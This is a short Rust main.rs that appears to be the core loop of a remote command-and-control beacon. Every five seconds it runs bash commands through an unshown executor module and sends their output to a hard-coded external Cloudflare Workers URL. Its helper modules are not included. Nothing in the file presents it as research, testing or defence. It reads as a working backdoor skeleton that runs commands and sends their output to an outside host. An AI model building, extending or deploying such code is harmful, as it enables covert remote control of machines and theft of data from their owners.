// src/main.rs
mod command_executor;
mod worker_communication;

#[tokio::main]
async fn main() {
    let worker_url = "https://serverworker.adoba.workers.dev/";

    let mut send_data = |output: String| {
        let worker_url = worker_url.to_string();
        async move {
            worker_communication::send_data_request(&worker_url, &output).await
        }
    };

    loop {
        let result = command_executor::execute_bash_command(true, &mut send_data);
        if let Err(e) = result {
            eprintln!("Error executing bash command: {}", e);
        }
        tokio::time::sleep(tokio::time::Duration::from_secs(5)).await; // Adjust the delay as needed
    }
}